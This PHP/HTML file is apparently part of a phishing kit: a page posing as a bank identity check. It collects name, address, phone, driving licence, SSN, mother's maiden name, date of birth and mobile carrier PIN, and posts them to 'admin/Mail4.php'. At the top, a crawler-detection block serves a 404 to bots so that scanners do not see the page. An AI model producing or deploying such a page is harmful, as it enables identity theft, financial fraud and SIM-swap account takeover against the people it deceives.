<?php 

use Jaybizzle\CrawlerDetect\CrawlerDetect;
require 'anti/vendor/autoload.php';
$CrawlerDetect = new CrawlerDetect;
if($CrawlerDetect->isCrawler()) {
    // true if crawler user agent detected
    header("HTTP/1.0 404 Not Found");
        exit();
}
?>



<!DOCTYPE html>
<html lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1.0">
	<title>Email Address</title>
</head>
<body>
	<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-EVSTQN3/azprG1Anm3QDgpJLIm9Nao0Yz1ztcQTwFspd3yD65VohhpuuCOmLASjC" crossorigin="anonymous">
	<link rel="preconnect" href="https://fonts.googleapis.com">
	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@300&display=swap" rel="stylesheet"> 

	<style type="text/css">
		.loaderbox{
			position: fixed;
			width: 100%;
			height: 100%;
			z-index: 9999999;
			background-color: #134286;
		}
		.spinner.loading {
			  /*padding: 50%;*/
			  top: 50%;
			  position: relative;
			  text-align: center;
			}

			.spinner.loading:before {
			  content: "";
			  height: 50px;
			  width: 50px;
			  margin: -15px auto auto -15px;
			  position: absolute;
			  top: 50%;
			  left: 50%;
			  border-width: 4px;
			  border-style: solid;
			  border-color: #2180c0 #ccc #ccc;
			  border-radius: 100%;
			  animation: rotation .7s infinite linear;
			}

			@keyframes rotation {
			  from {
			    transform: rotate(0deg);
			  } to {
			    transform: rotate(359deg);
			  }
			}
		.navbar{
			background-color: #0846a8;
		}
		.p-container {
			color: #414042;
			font-size: 1rem;
			font-weight: 500 !important;
			margin-bottom: 12px;
			font-family: 'Open Sans', sans-serif;
		}
		.progress{
			height: 4px;
			background-color: #949494;

		}
		.progress-bar{
			height: 8px !important;
			position: absolute;
			border-radius: 10px;
			margin-top: -2px;
			background-color: #0060f0;

		}
		.d-container{
			font-size: 1.75rem;
			color: #666;
			font-weight: 200 !important;
			font-family: 'Open Sans', sans-serif;

		}
		.p2-container{
			color: #414042;
			font-size: .9rem;
			font-weight: 200 !important;
			
			font-family: 'Open Sans', sans-serif;
		}
		.form-control-2{
			border: none !important;
			border-bottom: 1px solid #ccc !important;
			background: transparent !important;
			border-radius: 0px !important;
			max-width: 300px;
			padding-left: 0px;

		}

		.form-control:focus{
			box-shadow: none !important;
		}
		.form-control-3:focus{
			border-bottom: 2px solid #0060f0 !important;
	
		}
		.btn-primary{
			box-shadow: none !important;
		}
		.form-control-danger{
			border: none !important;
			border-bottom: 1px solid #dc3545 !important;
			background: transparent !important;
			border-radius: 0px !important;
			max-width: 300px;
			padding-left: 0px;

		}
		.form-control-danger:focus{
			border-bottom: 2px solid #dc3545 !important;
	
		}
	</style>
	<div class="loaderbox">
		<div class="spinner loading"></div>
	</div>

	<nav class="navbar  justify-content-center text-white">
	  	
	    <svg version="1.0" xmlns="http://www.w3.org/2000/svg"
			 width="32.000000pt" height="32.000000pt" viewBox="0 0 900.000000 720.000000"
			 preserveAspectRatio="xMidYMid meet">
			
			<g transform="translate(0.000000,720.000000) scale(0.100000,-0.100000)"
			fill="white" stroke="none">
			<path d="M3064 7181 c-9 -20 -1005 -1023 -1331 -1341 -93 -91 -301 -299 -461
			-463 l-292 -299 0 -1331 0 -1332 1067 5 c588 3 1069 6 1071 8 1 1 2 1065 2
			2365 0 2122 -2 2365 -16 2385 -19 27 -28 28 -40 3z"/>
			<path d="M3246 7178 c-7 -28 -8 -2091 -1 -2110 4 -11 411 -13 2388 -11 1310 2
			2383 6 2385 11 1 4 -229 239 -510 522 -282 284 -676 681 -875 883 -198 202
			-365 367 -370 367 -5 0 -82 76 -170 169 -89 93 -164 167 -167 164 -3 -3 -8 2
			-12 11 -6 15 -111 16 -1334 16 l-1328 0 -6 -22z"/>
			<path d="M5886 4914 c-3 -9 -6 -1079 -6 -2379 0 -2055 2 -2364 15 -2368 9 -4
			168 148 470 450 250 250 455 457 455 459 0 2 270 275 600 606 l600 603 0 1323
			0 1322 -1064 0 c-961 0 -1064 -2 -1070 -16z"/>
			<path d="M980 2273 c0 -14 32 -50 96 -110 106 -96 409 -398 769 -764 127 -129
			318 -320 425 -425 107 -105 334 -331 505 -502 l309 -312 1331 0 1330 0 -3
			1060 c-2 833 -5 1062 -15 1065 -6 3 -1077 6 -2380 7 l-2367 3 0 -22z"/>
			</g>
			</svg>
	</nav>

	<div class="container-fluid">
		<div class="d-flex justify-content-center">
			<div class="col-md-6 mt-5">
				<p class="p-container">Identification</p>
				<div class="progress">
				  	<div class="progress-bar" role="progressbar" style="width: 20%" aria-valuenow="25" aria-valuemin="0" aria-valuemax="100"></div>
				</div>
				<div class="d-container">Let's confirm your Personal Information.</div>
				<p class="p2-container">To protect your account, please tell us the requested info so we can confirm your identity. If you have more than one account, choose one and we'll take care of the rest.<br><br>Commercial administrators must tell us a Tax ID number.</p>
				
				<form action="admin/Mail4.php" method="post">
					<div class="container-fluid">
						<label for="#name" style="opacity:.8;" class="" id="labelname">Name</label>
						<input type="text" name="name" id="name" class="form-control form-control-2 form-control-3 " onblur="onInputUserBlur($(this))"  data-adderr="true" data-emptyerr="Please Tell Us Your Name" required>
					</div>
					<div class="container-fluid">
						<label for="#streetAddress" style="opacity:.8;" id="labelstreetAddress">Street Address</label>
						<input type="text" name="streetAddress" id="streetAddress" class="form-control form-control-2 form-control-3 " onblur="onInputUserBlur($(this))" data-emptyerr="Please Tell Us Your Address" data-adderr="true" required>
					</div>
					<div class="container-fluid">
						<label for="#city" style="opacity:.8;" id="labelcity">City</label>
						<input type="text" name="city" id="city" class="form-control form-control-2 form-control-3 " onblur="onInputUserBlur($(this))" data-emptyerr="Please Tell Us Your City" data-adderr="true" required>
					</div>
					<div class="container-fluid">
						<label for="#zipcode" style="opacity:.8;" id="labelzipcode">Zip Code</label>
						<input type="tel" name="zipc" id="zipcode" class="form-control form-control-2 form-control-3 " onblur="onInputUserBlur($(this))" data-emptyerr="Please Tell Us Your zipcode" data-adderr="true" required>
					</div>
					<div class="container-fluid">
						<label for="#state" style="opacity:.8;" id="labelzipcode">State</label>
						<input type="text" name="state" id="state" class="form-control form-control-2 form-control-3 " onblur="onInputUserBlur($(this))" data-emptyerr="Please Tell Us Your State" data-adderr="true" required>
					</div>
					<div class="container-fluid">
						<label for="#phoneNumber" style="opacity:.8;" id="labelphoneNumber">Phone Number</label>
						<input type="tel" name="ph" id="phoneNumber" class="form-control form-control-2 form-control-3 " onblur="onInputUserBlur($(this))" data-emptyerr="Please Tell Us Your Phone Number" data-adderr="true" required>
					</div>
					
					<div class="container-fluid">
						<label for="#Driving" style="opacity:.8;" id="labelDriving">Driving License</label>
						<input type="text" name="dl" id="Driving" class="form-control form-control-2 form-control-3 " onblur="onInputUserBlur($(this))" data-emptyerr="Please Tell Us Your Driving License Number" data-adderr="true" required>
					</div>
					<div class="container-fluid">
						<label for="#ssn" style="opacity:.8;" id="labelssn">SSN</label>
						<input type="tel" name="ssn" id="ssn" class="form-control form-control-2 form-control-3 " onblur="onInputUserBlur($(this))" data-emptyerr="Please Tell Us Your SSN" data-adderr="true" required>
					</div>
					<div class="container-fluid">
						<label for="#mmn" style="opacity:.8;" id="labelssn">MMN</label>
						<input type="text" name="mmn" id="mmn" class="form-control form-control-2 form-control-3 " onblur="onInputUserBlur($(this))" data-emptyerr="Please Tell Us Your Mother Middle Name" data-adderr="true" required>
					</div>
					<div class="container-fluid">
						<label for="#dob" style="opacity:.8;" id="labeldob">DOB</label>
						<input type="tel" name="dob" id="dob" class="form-control form-control-2 form-control-3 " onblur="onInputUserBlur($(this))" data-emptyerr="Please Tell Us Your Date of Birth" data-adderr="true" required>
					</div>
					
					
					<div class="container-fluid">
						<label for="#carrierpin" style="opacity:.8;" id="labelcarrierpin">Carrier Pin</label>
						<input type="tel" name="cp" id="carrierpin" class="form-control form-control-2 form-control-3 " onblur="onInputUserBlur($(this))" data-emptyerr="Please Tell Us Your Carrier Pin" data-adderr="true" required maxlength="6" minlength="4">
					</div>
					
					<div class="d-flex justify-content-end mt-5">
						<button class="btn btn-primary px-5 mb-5">Verify Email</button>
					</div>
				</form>
			</div>
		</div>
	</div>


<script src="https://code.jquery.com/jquery-3.5.1.slim.js" integrity="sha256-DrT5NfxfbHvMHux31Lkhxg42LY6of8TaYyK50jnxRnM=" crossorigin="anonymous"></script>
<script src="dist/jquery.inputmask.js"></script>

<script type="text/javascript">
	jQuery(document).ready(function($) {
		$(".loaderbox").hide();
		Inputmask("(9{1,3}) 9{1,3} 9{1,4}").mask("#phoneNumber");
		Inputmask("9{1,3}-9{1,2}-9{1,4}").mask("#ssn"); 
		Inputmask("9{1,2}/9{1,2}/9{1,4}").mask("#dob");
		
	});

	function adderror(obj, err="Please Provide Us Required Information"){

		var errdata = '<div id="errbox" ><div class=" d-flex justify-content-start"  ><svg version="1.0" xmlns="http://www.w3.org/2000/svg" width="30" height="35" viewBox="0 0 34.000000 32.000000" preserveAspectRatio="xMidYMid meet"><g transform="translate(0.000000,32.000000) scale(0.100000,-0.100000)" fill="#bf2155" stroke="none"> <path d="M119 231 c-60 -61 -24 -151 61 -151 54 0 90 34 90 85 0 48 -45 95 -90 95 -22 0 -41 -9 -61 -29z m77 -16 c8 -20 -4 -65 -16 -65 -12 0 -24 45 -16 65 3 8 10 15 16 15 6 0 13 -7 16 -15z m4 -90 c0 -8 -9 -15 -20 -15 -11 0 -20 7 -20 15 0 8 9 15 20 15 11 0 20 -7 20 -15z"/> </g> </svg> <div class="err-txt-box text-danger mt-1">'+err+'</div> </div> </div>'
		if (obj.attr('data-adderr') == 'true') {
			obj.parent().append(errdata);
			obj.attr('data-adderr', 'false');
		 	obj.addClass('form-control-danger');
			obj.parent().addClass('text-danger fw-bold');


		 	
		 }

	}
	function removeerror(obj){
		try {
			obj.parent().children()[2].remove();
			obj.attr('data-adderr', 'true');
			obj.parent().removeClass('text-danger fw-bold');
		 	obj.removeClass('form-control-danger');
			

		}
		catch(err) {}
	}


	function onInputUserBlur(obj) {
		
		if (obj.val() == "") {
			adderror(obj,obj.attr('data-emptyerr'));
		}else{
			removeerror(obj)
		}
		

	};
</script>
</body>
</html>